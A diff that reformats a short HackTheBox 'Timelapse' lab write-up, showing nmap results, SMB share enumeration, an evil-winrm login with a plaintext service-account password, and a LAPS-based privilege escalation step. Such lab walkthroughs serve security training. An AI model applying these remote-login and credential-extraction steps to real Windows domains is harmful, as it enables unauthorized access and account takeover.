@@ -1,13 +1,15 @@
-----------------------------------------------------
-# Author -> Shubham Rannpise
-----------------------------------------------------
 # Timelapse
-# 14/4/2023
+
+
+| Key | Value |
+|-----|-------|
+| Platform | HackTheBox |
+| OS | Windows |
+| Difficulty | Easy |
+
 10.10.11.152
 
-----------------------------------------------------
-# nmap
-----------------------------------------------------
+## Recon
 PORT     STATE SERVICE           VERSION
 53/tcp   open  domain            Simple DNS Plus
 88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-04-14 18:16:26Z)
@@ -21,9 +23,7 @@ PORT     STATE SERVICE           VERSION
 3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
 3269/tcp open  globalcatLDAPssl?
 
-----------------------------------------------------
-# enum
-----------------------------------------------------
+## Enumeration
 smbclient -L //10.10.11.152/
         Sharename       Type      Comment
         ---------       ----      -------
@@ -55,9 +55,7 @@ evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
 
 net user svc_deploy
 
-----------------------------------------------------
-# priv esc
-----------------------------------------------------
+## Privilege Escalation
 upload AdmPwd.PS
 https://github.com/ztrhgf/LAPS
 
